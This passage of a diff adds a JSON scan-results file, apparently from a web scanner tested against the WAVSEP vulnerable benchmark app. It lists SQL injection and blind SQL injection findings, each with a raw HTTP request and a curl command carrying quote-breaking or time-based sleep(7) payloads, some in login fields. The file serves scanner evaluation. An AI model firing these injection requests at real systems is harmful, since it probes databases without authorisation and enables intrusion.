+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%BF%27%22%28&target=a%40a.com", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -d \"msg=%BF%27%22%28&target=a%40a.com\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter target", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=readme&target=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -d \"msg=readme&target=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "target", 
+        "method": "POST"
+      }
+    ], 
+    "Blind SQL Injection": [
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp?transactionDate=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp?transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp?msgId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp?msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp?minBalanace=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp?minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp?msgid=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp?msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp?transactionDate=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp?transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp?msgId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp?msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp?minBalanace=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp?minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp?msgid=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp?msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=%27%20or%20sleep%287%29%231&password=textvalue2 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=%27%20or%20sleep%287%29%231&password=textvalue2\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter password", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=textvalue&password=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=textvalue&password=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp", 
+        "parameter": "password", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp?msg=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp?msg=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp?username=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp?username=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp?msg=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp?msg=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp?msgId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp?msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp?msgid=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp?msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp?transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?transactionDate=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp?transactionId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp?transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?msgId=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=sleep%287%29%231 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
